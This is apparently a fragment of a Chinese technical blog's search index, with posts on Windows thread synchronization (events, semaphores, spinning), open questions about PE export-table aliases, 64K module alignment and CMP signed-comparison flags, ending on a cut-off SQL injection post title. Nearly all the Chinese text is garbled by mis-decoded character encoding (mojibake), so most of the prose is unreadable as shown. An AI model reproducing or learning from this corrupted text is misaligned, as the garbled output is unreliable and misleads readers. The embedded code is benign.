çº¿ç¨‹Aåœ¨ä¸´ç•ŒåŒºä¸­ï¼ŒCPUæ—¶é—´ç‰‡è€—å°½ï¼Œçº¿ç¨‹Bè·å¾—CPUæ—¶é—´ç‰‡ï¼Œä½†è¿›ä¸å»ä¸´ç•ŒåŒºã€‚è°ƒåº¦ç¨‹åºä¼šå°†çº¿ç¨‹Bæ”¾å…¥ç­‰å¾…é˜Ÿåˆ—ä¸­ï¼ˆç¡çœ ï¼‰ï¼Œçº¿ç¨‹Bä¸ä¼šç»§ç»­æ¶ˆè€—CPUæ—¶é—´ã€‚æ­¤æ—¶æ“ä½œç³»ç»Ÿä¼šå°†CPUæ—¶é—´ç‰‡åˆ†é…ç»™å…¶ä»–å¯è¿è¡Œçš„çº¿ç¨‹ï¼ˆåŒ…æ‹¬çº¿ç¨‹Aï¼‰ã€‚çº¿ç¨‹Aé‡æ–°è·å¾—CPUæ—¶é—´ç‰‡ï¼Œç¦»å¼€ä¸´ç•ŒåŒºå¹¶é‡Šæ”¾é”ï¼Œæ“ä½œç³»ç»Ÿä¼šå”¤é†’åœ¨ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹Bï¼ˆï¼Ÿå¦‚æœè¿˜æœ‰ä¸€ä¸ªä¸ç›¸å…³çš„çº¿ç¨‹Cï¼Œæ˜¯Bå…ˆï¼Œè¿˜æ˜¯Bå’ŒCéšæœºã€‚markï¼Œè¿™å—éœ€è¦é˜…è¯»æ“ä½œç³»ç»Ÿè°ƒåº¦çš„æºç ï¼Œåé¢å†ç»†å†™ï¼‰ã€‚ çº¿ç¨‹Aå‡ºä¸´ç•ŒåŒºé‡Šæ”¾ä»¤ç‰Œåï¼Œè¿›åˆ°å°±ç»ªé˜Ÿåˆ—ï¼Œçº¿ç¨‹Aå’Œçº¿ç¨‹Bè·å¾—CPUæ—¶é—´ç‰‡çš„æœºä¼šæ˜¯å‡ç­‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œçº¿ç¨‹Aå‡ºä¸´ç•ŒåŒºåï¼Œæœ‰å¯èƒ½å†æ¬¡è¿›åˆ°ä¸´ç•ŒåŒºï¼Œè€Œä¸ä¿è¯çº¿ç¨‹Aå‡ºä¸´ç•ŒåŒºåï¼Œå°±è½®åˆ°çº¿ç¨‹Bè¿›ä¸´ç•ŒåŒºã€‚ å¦‚æœçº¿ç¨‹Aå‡ºä¸´ç•ŒåŒºåï¼Œä¸éœ€è¦å†æ¬¡è¿›å…¥ä¸´ç•ŒåŒºï¼›å½“çº¿ç¨‹Bè¢«é˜»å¡æ—¶ï¼Œè®©è¿™ä¸ªçº¿ç¨‹Bå¾ªç¯ç­‰å¾…è¯·æ±‚é”ï¼Œé¿å…ç¡çœ åæ¥ä¸€æ¬¡å”¤é†’ï¼ˆç¡çœ -&gt;å”¤é†’æœ‰å¼€é”€ï¼‰ï¼Œåˆç§°â€œè‡ªæ—‹â€ã€‚ä¸è¿‡è¿™æ–¹å¼ä¹Ÿä¸é è°±ï¼Œæ°¸è¿œä¸èƒ½å‡è®¾çº¿ç¨‹çš„è°ƒåº¦ç­–ç•¥æ˜¯æŒ‰é¢„æƒ³çš„æ¥æ‰§è¡Œã€‚ äº‹ä»¶ï¼ˆEventï¼‰å¯¹è±¡ CreateEvent ä½¿ç”¨CreateEventåˆ›å»ºäº‹ä»¶å¯¹è±¡ï¼ˆEvent Objectï¼‰ã€‚äº‹ä»¶å¯¹è±¡æœ‰ä¸¤ç§çŠ¶æ€ï¼š signaled stateï¼šæœ‰ä¿¡å·/æˆä¿¡çŠ¶æ€ non signaled stateï¼šæ— ä¿¡å·/æ— çŠ¶æ€ 123456HANDLE CreateEventA( // è¿”å›äº‹ä»¶å¯¹è±¡çš„å¥æŸ„ [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes, // SD å®‰å…¨å±æ€§ï¼ŒåŒ…å«å®‰å…¨æè¿°ç¬¦ [in] BOOL bManualReset, // reset type é‡ç½®ç±»å‹ [in] BOOL bInitialState, // initial state åˆå§‹åŒ–çŠ¶æ€ [in, optional] LPCSTR lpName // event object name äº‹ä»¶å¯¹è±¡å); lpEventAttributesï¼šSDï¼Œå®‰å…¨å±æ€§ï¼ŒåŒ…å«å®‰å…¨æè¿°ç¬¦ï¼Œä¸€èˆ¬è®¾ç½®ä¸ºNULL bManualResetï¼šé‡ç½®ç±»å‹ï¼ŒæŒ‡ç¤ºäº‹ä»¶å¯¹è±¡æ˜¯æ‰‹åŠ¨é‡ç½®ï¼ˆmanual-reset event objectï¼‰è¿˜æ˜¯è‡ªåŠ¨é‡ç½®ï¼ˆauto-reset event objectï¼‰ TRUEï¼šæ‰‹åŠ¨é‡ç½®ã€‚éœ€è¦æ‰‹åŠ¨è°ƒç”¨RestEventå‡½æ•°å°†Eventå¯¹è±¡é‡ç½®ä¸ºæ— ä¿¡å·çŠ¶æ€ FALSEï¼šè‡ªåŠ¨é‡ç½®ã€‚Eventå¯¹è±¡å—ä¿¡åä¼šè‡ªåŠ¨é‡ç½®ä¸ºæ— ä¿¡å·çŠ¶æ€ bInitialStateï¼šEventäº‹ä»¶å¯¹è±¡è¢«åˆ›å»ºåçš„åˆå§‹çŠ¶æ€æ˜¯æœ‰ä¿¡å·è¿˜æ˜¯æ— ä¿¡å·çŠ¶æ€ TRUEï¼šæœ‰ä¿¡å·ï¼Œsignaled FALSEï¼šæ— ä¿¡å·ï¼Œnon signaled lpNameï¼šEventå¯¹è±¡çš„åç§° SetEvent SetEventå°†æ— ä¿¡å·çš„Eventå¯¹è±¡è®¾ç½®ï¼ˆSetï¼‰ä¸ºæˆä¿¡çŠ¶æ€ 1BOOL SetEvent( HANDLE hEvent // handle to event); ReSetEvent ReSetEventå°†æœ‰ä¿¡å·çš„Eventå¯¹è±¡é‡ç½®ï¼ˆReSetï¼‰ä¸ºæ— ä¿¡å·çŠ¶æ€ 1BOOL ResetEvent( HANDLE hEvent // handle to event); Eventå¯¹è±¡çš„çŠ¶æ€å¯ä»¥é€šè¿‡æ‰‹åŠ¨è®¾ç½®æˆ–è‡ªåŠ¨é‡ç½®æ¥é€šçŸ¥å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ ·å°±èƒ½è¿›è¡Œâ€œé€šä¿¡â€ï¼Œå°±èƒ½ç”¨äºçº¿ç¨‹çš„åŒæ­¥æ§åˆ¶ ä¿¡å·é‡ï¼ˆSemaphoreï¼‰å¯¹è±¡ ç›¸æ¯”äºäº‹ä»¶ï¼Œä¿¡å·é‡æœ‰å¯ç”¨èµ„æºè®¡æ•°å™¨çš„æ¦‚å¿µã€‚ç¬”è€…åœ¨ä½¿ç”¨æ—¶å°±æ˜¯å°†ä¿¡å·é‡ç†è§£ä¸ºâ€œé€šçŸ¥â€ï¼Œåªä¸è¿‡å¤šäº†è®¡æ•°å™¨çš„æ¦‚å¿µã€‚ ä½¿ç”¨CreateSemaphoreAåˆ›å»ºä¿¡å·é‡å¯¹è±¡ 123456HANDLE CreateSemaphoreA( [in, optional] LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, // SD [in] LONG lInitialCount, // initial count åˆå§‹å¯ç”¨èµ„æºæ•° [in] LONG lMaximumCount, // maximum count æœ€å¤§å¯ç”¨èµ„æºæ•° [in, optional] LPCSTR lpName // object name); å‚æ•° lInitialCount æŒ‡å®šåˆå§‹å¯ç”¨èµ„æºæ•°é‡ï¼Œå‡è®¾åˆå§‹èµ„æºæ•°é‡ä¸º 2ï¼Œå¦‚æœæœ‰ 5 ä¸ªçº¿ç¨‹æ­£åœ¨è°ƒç”¨ WaitForSingleObject å‡½æ•°ç­‰å¾…è¯¥ä¿¡å·é‡ï¼Œåˆ™æœ‰ 2 ä¸ªçº¿ç¨‹ä¼šè¢«å”¤é†’ï¼Œæ¯è°ƒç”¨ä¸€æ¬¡ WaitForSingleObject è·å¾— Semaphore å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„èµ„æºè®¡æ•°ä¼šå‡å°‘ä¸€ä¸ªã€‚ å‚æ•° lMaximumCount æœ€å¤§èµ„æºæ•°é‡ä¸Šé™ï¼Œè¿™ä¸ªå€¼å¿…é¡»å¤§äº0 çº¿ç¨‹è°ƒç”¨WaitForSingleObjectç­‰å¾…ä¿¡å·é‡å¯ç”¨ï¼Œç­‰å¾…åˆ°åä¿¡å·é‡çš„èµ„æºè®¡æ•°ä¼šå‡1.å¦‚æœä½¿ç”¨ ReleaseSemaphore ï¼ˆé‡Šæ”¾ä¿¡å·é‡ï¼‰æ¥å¢åŠ èµ„æºè®¡æ•° 12345BOOL ReleaseSemaphore( [in] HANDLE hSemaphore, // handle to semaphore [in] LONG lReleaseCount, // count increment amount éœ€è¦å¢åŠ çš„èµ„æºä¸ªæ•° [out, optional] LPLONG lpPreviousCount // previous count); å‚æ•° hSemaphore æ˜¯éœ€è¦æ“ä½œçš„ä¿¡å·é‡å¥æŸ„ï¼› å‚æ•° lReleaseCountï¼Œéœ€è¦å¢åŠ çš„èµ„æºæ•°é‡ï¼› å‚æ•° lpPreviousCount æ˜¯ä¸€ä¸ª long å‹ï¼ˆ32 ä½ç³»ç»Ÿä¸Š 4 ä¸ªå­—èŠ‚ï¼‰çš„æŒ‡é’ˆï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸåï¼Œè¿”å›ä¸Šä¸€æ¬¡èµ„æºçš„æ•°é‡ï¼Œå¦‚æœç”¨ä¸åˆ°è¯¥å‚æ•°ï¼Œå¯ä»¥è®¾ç½®ä¸º NULLã€‚ ä½¿ç”¨ReleaseSemaphoreå¢åŠ èµ„æºæ•°é‡ï¼Œæœ€å¤§ä¸èƒ½è¶…è¿‡lMaximumCountï¼Œè¿™ä¸ªå€¼å¿…é¡»è®¾ç½®å¤§äº 0 çº¿ç¨‹åŒæ­¥ çº¿ç¨‹Aå‡ºä¸´ç•ŒåŒºåï¼Œå¾ˆå¯èƒ½å†æ¬¡è¿›å…¥ä¸´ç•ŒåŒºã€‚çº¿ç¨‹äº’æ–¥åªèƒ½ä¿è¯åŒä¸€æ—¶åˆ»å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®åªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸èƒ½ä¿è¯çº¿ç¨‹çš„å…ˆåé¡ºåºï¼Œå®ƒæ˜¯æ— åºçš„ã€‚å¦‚æœå¯¹çº¿ç¨‹çš„å…ˆåé¡ºåºæœ‰è¦æ±‚ï¼Œé‚£å°±æ˜¯åšåŒæ­¥æ§åˆ¶ã€‚åŒæ­¥=äº’æ–¥+æœ‰åºã€‚ å¤æ‚çº¿ç¨‹æ§åˆ¶é—®é¢˜ æ—¢éœ€è¦åšåŒæ­¥æ§åˆ¶ï¼Œåˆéœ€è¦åšäº’æ–¥æ§åˆ¶ã€‚ä¾‹å­å¯å‚è€ƒè¿™é“é¢˜å•ç”Ÿäº§è€…-å¤šBuffer-å¤šæ¶ˆè´¹è€… å‚è€ƒé“¾æ¥ 3.6 Windows çº¿ç¨‹èµ„æºåŒæ­¥å¯¹è±¡","tags":["çº¿ç¨‹åŒæ­¥","çº¿ç¨‹äº’æ–¥"],"categories":["ç³»ç»Ÿç¼–ç¨‹","Windows APIç¼–ç¨‹"]},{"title":"ã€æ±‚åŠ©æ–‡ã€‘ä¸€äº›æš‚æ—¶æ²¡æ‰¾åˆ°ç­”æ¡ˆçš„è®¡ç®—æœºé—®é¢˜","path":"/posts/3d7b63a8.html","content":"é—®é¢˜æè¿°æ¨¡æ¿ é—®é¢˜ç®€è¦æè¿° åšå®¢ä¸­ä¸è¿™å—çŸ¥è¯†ç›¸å…³çš„æ–‡ç« é“¾æ¥ï¼ˆå¯é€‰ï¼‰ è¯¦ç»†ç»†èŠ‚ å°è¯•æ€è€ƒçš„è¿‡ç¨‹ æ€ç»´å‘æ•£å’Œæ‰©å±•ï¼ˆå¯é€‰ï¼‰ ç›®å½•ç´¢å¼•è¡¨ï¼š é—®é¢˜åç§° è¯¥é—®é¢˜è§£å†³çš„è¿«åˆ‡ç¨‹åº¦ PEå¯¼å‡ºè¡¨åœ°å€è¡¨ä¼˜åŒ–é—®é¢˜ã€é—®é¢˜æ±‚åŠ©ä¸­ï¼Œæœªè§£å†³ã€‘ 1 æ¨¡å—é—´å¯¹é½å€¼ã€é—®é¢˜æ±‚åŠ©ä¸­ï¼Œæœªè§£å†³ã€‘ 1 CMPæŒ‡ä»¤ä¸æœ‰ç¬¦å·æ•°ã€é—®é¢˜æ±‚åŠ©ä¸­ï¼Œæœªè§£å†³ã€‘ 0 ã€é—®é¢˜æ±‚åŠ©ä¸­ï¼Œæœªè§£å†³ã€‘ ã€é—®é¢˜å·²äºxxxæ—¶é—´è§£å†³ã€‘ è¯¥é—®é¢˜è§£å†³çš„è¿«åˆ‡ç¨‹åº¦ï¼š 0ï¼šè§£å†³å¼ºè¿«ç—‡ï¼Œè¿™ä¸ªé—®é¢˜è§£å†³äº†å¯èƒ½ä¹Ÿæ²¡å•¥ç”¨ 1ï¼šæ¯”0é«˜ï¼Œç ”ç©¶ä»·å€¼å¯èƒ½ä¹Ÿä¸æ˜¯å¾ˆé«˜ PEå¯¼å‡ºè¡¨åœ°å€è¡¨ä¼˜åŒ–é—®é¢˜ é—®é¢˜ç®€è¦æè¿° å†™dllæ—¶å­˜åœ¨å‡½æ•°åˆ«åï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ã€‚ä¸ºä»€ä¹ˆåœ°å€è¡¨ä¸­è¿˜ä¼šå°†å‡½æ•°åˆ«åçš„å‡½æ•°åœ°å€åˆå­˜ä¸€éï¼Œè€Œä¸æ˜¯è®©åºå·è¡¨é‡Œå¤šä¸ªåºå·æŒ‡å‘åœ°å€è¡¨çš„åŒä¸€é¡¹ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘åœ°å€è¡¨ä¸­é‡å¤çš„å‡½æ•°åœ°å€å­˜å‚¨ï¼ŒèŠ‚çœç©ºé—´ã€‚ åšå®¢ä¸­ä¸è¿™å—çŸ¥è¯†ç›¸å…³çš„æ–‡ç« é“¾æ¥ï¼ˆå¯é€‰ï¼‰ å¯¼å‡ºè¡¨ è¯¦ç»†ç»†èŠ‚ æµ‹è¯•ç”¨çš„dllæ–‡ä»¶æºç å¦‚ä¸‹ï¼Œç”¨VS 32ä½ç¼–è¯‘ ArithmeticOperations.h123456#pragma onceint __stdcall Plus(int x, int y);int __stdcall Sub(int x, int y);int __stdcall Mul(int x, int y);int __stdcall Div(int x, int y);Source.def123456789;LIBRARY;EXPORTS\t;\tPlus @1;\t;Add = Plus ; Add is an alias for Plus;\t;Add2 = Plus ; Add2 also is an alias for Plus;\tSub @2 NONAME;\tMul @3;\tDiv @4åŠ å‡ä¹˜é™¤ï¼Œå¯¹åº”åºå·1ï¼Œ2ï¼Œ3ï¼Œ4åŒæ—¶è¿˜æœ‰ä¸¤ä¸ªåˆ«åï¼šåˆ†åˆ«æ˜¯Addï¼ŒAdd2ä½œä¸ºPluså‡½æ•°çš„åˆ«å ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; åŸºäºè¿™ä¸‹é¢è¿™ä¸¤ç‚¹è®¤çŸ¥ï¼š é€šè¿‡å¯¼å‡ºå‡½æ•°åå­—åœ¨å¯¼å‡ºå‡½æ•°åç§°è¡¨æŸ¥å®Œåï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦ä¸€ä¸ªåºå·è¡¨ï¼Ÿå› ä¸ºï¼šä¸€ä¸ªå¯¼å‡ºå‡½æ•°å¯èƒ½æœ‰å¤šä¸ªåå­—ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸€ä¸ªåºå·è¡¨ï¼Œç”¨äºç”¨äºè¿æ¥åç§°è¡¨å’Œåœ°å€è¡¨ã€‚ å¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„ä¸ªæ•°æ˜¯NumberOfFunctionsä¸ªï¼Œè®¡ç®—æ–¹æ³•æ˜¯ï¼šå¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å¤§çš„-å¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å°çš„+1ã€‚æ¯”å¦‚å†™dllæ—¶.defåºå·æœ€å°æ˜¯11ï¼Œæœ€å¤§æ˜¯15ï¼Œé‚£ä¹ˆä¸€å…±æœ‰15-11+1=5ä¸ªã€‚å¦‚æœåªç”¨åˆ°11ï¼Œ12ï¼Œ13ï¼Œ15ï¼›14æ²¡ç”¨åˆ°ï¼Œåœ°å€è¡¨ä¸­14é‚£é¡¹å‡½æ•°åœ°å€è¡¥0 ä»¥ä¸ºæŸ¥çœ‹dllä¸­ä¸‰å¼ å­è¡¨çš„æƒ…å†µå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šè®¤ä¸ºAddï¼ŒAdd2ï¼Œplusåç§°åœ¨åºå·è¡¨éƒ½æŒ‡å‘åŒä¸€ä¸ªåºå·å€¼ï¼ˆåç§°è¡¨æœ‰å¤šå°‘ä¸ªï¼Œåºå·è¡¨å°±æœ‰å¤šå°‘ä¸ªï¼‰ã€‚ç„¶åå¤šä¸ªåºå·éƒ½æŒ‡å‘åœ°å€è¡¨çš„åŒä¸€é¡¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨åœ°å€è¡¨ä¸­å‡½æ•°åœ°å€0x00011235åªå­˜ä¸€æ¬¡ã€‚ ä½†å®é™…æƒ…å†µæ˜¯ï¼š ç®—ä¸Šåˆ«å2æ¬¡ï¼ŒåŠ ä¸ŠPlusæœ¬åï¼Œå®ƒå°†Pluså‡½æ•°å‡½æ•°åœ°å€åœ¨åœ°å€è¡¨å­˜äº†3éï¼ ä¸Šè¿°å®éªŒå¾—åˆ°çš„ç»“è®ºæ˜¯ï¼š åœ°å€è¡¨ä¸ªæ•°æ— æ³•&gt;åå­—è¡¨ã€‚å› ä¸ºå³ä½¿å¤šäº†åˆ«åï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„å‡½æ•°åœ°å€è¡¨ä¹Ÿä¼šå†å­˜ä¸€éåˆ«åçš„å‡½æ•°çš„å‡½æ•°åœ°å€ã€‚å®ƒä¸ä¼šè®©åç§°è¡¨ä¸­å¤šä¸ªå€¼æŒ‡å‘åœ°å€è¡¨ä¸­åŒä¸€é¡¹ï¼Œæ¥è¾¾åˆ°ä¼˜åŒ–å­˜å‚¨çš„ç›®çš„ã€‚ NumberOfFunctions=å¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å¤§çš„-å¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å°çš„+1ï¼Œè¿˜è¦è¿›è¡Œè¡¥å……ï¼š å¯¼å‡ºåºå·ä¸è¿ç»­å¯¼è‡´äº†ç©ºä½ï¼Œç„¶ååˆæœ‰åˆ«åï¼Œåˆ«åä¼šå…ˆå ç©ºä½çš„ä½ç½®ï¼Œç©ºä½æ²¡äº†ï¼Œåœ°å€è¡¨ç»§ç»­å¢åŠ é¡¹æ•° å’Œä¹‹å‰çš„è®¤çŸ¥ä¸ç¬¦ï¼š åœ°å€è¡¨ä¸ªæ•°å¯èƒ½&gt;åå­—è¡¨ï¼Œå› ä¸ºå¯ä»¥å¤šä¸ªåå­—å¯¹åº”åŒä¸€ä¸ªå‡½æ•°åœ°å€ NumberOfFunctions=å¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å¤§çš„-å¯¼å‡ºå‡½æ•°ä¸­åºå·æœ€å°çš„+1ã€‚ å°è¯•æ€è€ƒçš„è¿‡ç¨‹ ä»¥å‡½æ•°åæŸ¥æ‰¾å¯¼å‡ºå‡½æ•°æ–¹å¼æ˜¯å…ˆå»åç§°è¡¨åŒ¹é…ï¼Œæ‰¾åˆ°æ•°ç»„çš„ç´¢å¼•å€¼ï¼ŒAddå’ŒPluså¾—åˆ°çš„æ•°ç»„ç´¢å¼•å€¼æ²¡æ³•ä¸€æ ·ï¼Œæ‰€ä»¥è¿˜éœ€è¦åºå·è¡¨åšä¸­è½¬ã€‚åºå·è¡¨ç”¨äºè¿æ¥å‡½æ•°åå’Œåœ°å€è¡¨ï¼Œæ‰€ä»¥åºå·è¡¨ä¸ªæ•°å’Œåç§°è¡¨ä¸ªæ•°ä¸€æ ·ï¼Œè¿™ä¸ªèƒ½æ¥å—ã€‚é‚£åºå·è¡¨[0]ï¼Œåºå·è¡¨[1]ï¼Œåºå·è¡¨[4]éƒ½å­˜ä¸ª0å‘—ï¼Œå°±éƒ½æŒ‡å‘åœ°å€è¡¨[0]ï¼Œè¿™æ ·å°±èŠ‚çœäº†åœ°å€è¡¨çš„å­˜å‚¨ç©ºé—´äº†ï¼Œä½†ç”¨VSæˆ–ç”¨VCç¼–è¯‘çš„dllå¹¶æ²¡æœ‰è¿™æ ·ã€‚ æ€ç»´å‘æ•£å’Œæ‰©å±•ï¼ˆå¯é€‰ï¼‰ å¦‚æœæƒ³å¯¹å‡½æ•°åœ°å€è¡¨å­˜çš„åœ°å€å»é‡ï¼Œåªç•™ä¸‹ä¸€ä¸ªï¼›å†ä¿®æ”¹åºå·è¡¨é‡Œçš„å…³ç³»ã€‚ç¬¬ä¸€æ­¥å°±æ˜¯é“ç®—æ³•é¢˜äº†ï¼šåˆ é™¤æ— åºé¡ºåºè¡¨ä¸­é‡å¤çš„å…ƒç´ ï¼Œåªç•™ä¸‹ä¸€ä¸ª ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶åŠ ä¸Šå»é‡å¹¶ä¸éš¾ï¼Œä¸æ¸…æ¥šä¸ºå•¥æ²¡æœ‰å®ç° åœ°å€è¡¨å»é‡çš„å·¥ä½œæ²¡ç»§ç»­åšï¼Œç›®å‰è§‰å¾—æ²¡å•¥ç ”ç©¶ä»·å€¼ï¼Œå¯ä»¥ç”¨äºå¯¼å‡ºè¡¨å‹ç¼©ï¼Ÿä½†å‹ç¼©çš„è¿™ç‚¹ç©ºé—´å¥½åƒä¸å¤Ÿçœ‹çš„ã€‚å…ˆè®°ä¸‹ï¼Œæœªæ¥æœ‰æœºä¼šå†çœ‹å§ æ¨¡å—é—´å¯¹é½å€¼ é—®é¢˜ç®€è¦æè¿° åœ¨è¿›ç¨‹ç©ºé—´ä¸­ï¼Œæ¨¡å—ä¸æ¨¡å—ä¹‹é—´çš„å¯¹é½å€¼ä¸ºä»€ä¹ˆæ˜¯64k åšå®¢ä¸­ä¸è¿™å—çŸ¥è¯†ç›¸å…³çš„æ–‡ç« é“¾æ¥ï¼ˆå¯é€‰ï¼‰ wiki-PE-ä¸€äº›æ¦‚å¿µæ–‡ç«  è§‚æµ‹ç»†èŠ‚ ç”¨ODæ‹–è¿›32ä½çš„notepadï¼Œæ‰¾äº†ä¸¤ä¸ªç›¸é‚»çš„æ¨¡å— æ¨¡å—å åŸºå€ å¤§å° åŸºå€+å¤§å° IMM32 75610000h 26000h 75636000h gdi32ful 75640000h æ¨¡å—IMM32æœ«å°¾åœ°å€75636000hå’Œä¸‹ä¸€ä¸ªæ¨¡å—gdi32fulåŸºå€75640000hï¼Œä¹‹é—´ï¼Œå¡«å……äº†4000hã€‚å‘ç°æ¨¡å—ä¸€å’Œæ¨¡å—äºŒä¹‹é—´ç¡®å®æ˜¯æŒ‰64kå¯¹é½ï¼Œå³10000hã€‚æ¢ä¸ªçœ‹æ³•ï¼Œæ¨¡å—IMM32å’Œæ¨¡å—gdi32fulçš„åŸºå€ä¹Ÿæ˜¯10000hçš„æ•´æ•°å€ã€‚ å°è¯•æ€è€ƒçš„è¿‡ç¨‹ ä½†ä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¯¹é½å€¼æ˜¯64kï¼Œæ„Ÿè§‰åƒä¸ªé­”æ•°ï¼ˆmagic numberï¼‰ã€‚1ä¸ªç‰©ç†å°é¡µ4kbï¼Œ16ä¸ªç‰©ç†é¡µï¼Œç”¨æ®µå¼å’Œé¡µå¼ç®¡ç†çš„çŸ¥è¯†ä¹Ÿä¸æ¸…æ¥šæ€ä¹ˆå‡‘å‡º64kè¿™ä¸ªæ•°ã€‚ gpt4å›ç­”ï¼šâ€œåœ¨è¿›ç¨‹ç©ºé—´ä¸­ï¼Œå„æ¨¡å—é—´é€šå¸¸é‡‡ç”¨è¾ƒå¤§çš„å¯¹é½å€¼ï¼Œå¦‚64KBï¼Œä»¥é¿å…æ¨¡å—é—´æ•°æ®çš„å†²çªå’Œä¾¿äºå†…å­˜ç®¡ç†ã€‚è¿™ç§å¤§å°ºå¯¸å¯¹é½æœ‰åŠ©äºæ“ä½œç³»ç»Ÿæ›´é«˜æ•ˆåœ°åˆ†é…å’Œç®¡ç†å†…å­˜ç©ºé—´ï¼Œå°½ç®¡è¿™ä¼šåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ å†…å­˜çš„ç¢ç‰‡ã€‚â€æ„æ€å°±æ˜¯é€‰ä¸ªå¤§ç‚¹çš„å°ºå¯¸å‘—ï¼Œä½†ç¬”è€…æƒ³è¦ä¸ªæ›´â€œå¥½â€çš„å›ç­”ã€‚ CMPæŒ‡ä»¤ä¸æœ‰ç¬¦å·æ•° é—®é¢˜ç®€è¦æè¿° CMPæŒ‡ä»¤æ‰§è¡Œåï¼Œå¦‚æœé€šè¿‡SFå’ŒOFä¸¤ä¸ªç¬¦å·ä½æ¥çŸ¥é“æœ‰ç¬¦å·æ•°æ¯”è¾ƒçš„ç»“æ„ åšå®¢ä¸­ä¸è¿™å—çŸ¥è¯†ç›¸å…³çš„æ–‡ç« é“¾æ¥ï¼ˆå¯é€‰ï¼‰ æ ‡å¿—å¯„å­˜å™¨å’ŒJCCæŒ‡ä»¤ è¯¦ç»†ç»†èŠ‚ CMPï¼ˆæ¯”è¾ƒ)æŒ‡ä»¤æ‰§è¡Œä»ç›®çš„æ“ä½œæ•°ä¸­å‡å»æºæ“ä½œæ•°çš„éšå«å‡æ³•æ“ä½œï¼Œå¹¶ä¸”ä¸ä¿®æ”¹ä»»ä½•æ“ä½œæ•°ï¼š 1CMP destination,source å¦‚æœæ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªæœ‰ç¬¦å·æ•°,åˆ™ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½å’Œæº¢å‡ºæ ‡å¿—ä½è¡¨ç¤ºçš„ä¸¤ä¸ªæ“ä½œæ•°ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹è¡¨æ‰€ç¤º: CMPç»“æœ æ ‡å¿—ä½ å¤‡æ³¨ ç›®çš„æ“ä½œæ•°ï¼œæºæ“ä½œæ•° SFâ‰ OF ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•° SF=OF ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•° ZF=1 ä¸€æ ·å¤§ï¼Œç»“æœ=0ï¼ŒZF=1 å°è¯•æ€è€ƒçš„è¿‡ç¨‹ ç›®çš„æ“ä½œæ•°ï¼œæºæ“ä½œæ•°ï¼ˆä¸å¤Ÿå‡ï¼‰ ç›®çš„æ“ä½œæ•°ï¼æºæ“ä½œæ•°ï¼ˆå¤Ÿå‡ï¼‰ æ­£-æ­£&lt;=&gt;æ­£+è´Ÿ æ¯”å¦‚2-3ï¼Œç»“æœä¸ºè´Ÿï¼ŒSF=1ã€‚æ­£+è´Ÿä¸ä¼šæœ‰æº¢å‡ºï¼ŒOF=0 æ¯”å¦‚3-2ï¼Œç»“æœä¸ºæ­£ï¼ŒSF=0ã€‚æ²¡æœ‰æº¢å‡ºï¼ŒOF=0 æ­£-è´Ÿ&lt;=&gt;æ­£+æ­£ è´Ÿ-æ­£&lt;=&gt;æ­£+è´Ÿ è´Ÿ-è´Ÿ&lt;=&gt;æ­£+è´Ÿ SFè¡¨ç¤ºæœ‰ç¬¦å·æ•´å‹çš„æœ€é«˜æœ‰æ•ˆä½ã€‚(0æŒ‡ç¤ºç»“æœä¸ºæ­£ï¼Œåä¹‹åˆ™ä¸ºè´Ÿ) OFç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡º æ­£ï¼‹æ­£=æ­£ï¼Œä½†å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º è´Ÿï¼‹è´Ÿ=è´Ÿï¼Œä½†å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º æ­£ï¼‹è´Ÿï¼Œæ°¸è¿œéƒ½ä¸ä¼šæœ‰æº¢å‡º æ²¡åˆ†æå‡ºæ¥","tags":["é—®é¢˜æ±‚åŠ©"],"categories":["è®¡ç®—æœºçŸ¥è¯†","é—®é¢˜æ±‚åŠ©"]},{"title":"é‚£äº›æœ‰ç€å¼‚æ›²åŒå·¥ä¹‹å¤„çš„è®¡ç®—æœºçŸ¥è¯†","path":"/posts/32e8f536.html","content":"è®°å½•å­¦ä¹ è¿‡ç¨‹ä¸­é‚£äº›æœ‰ç€å¼‚æ›²åŒå·¥ä¹‹å¤„çš„AçŸ¥è¯†å’ŒBçŸ¥è¯†ï¼Œä¸å®šæœŸæ›´æ–°è¡¥å……ã€‚ SQLæ³¨å…¥ å’Œ æ•°æ®åŒºæ‰§è¡Œä»£ç  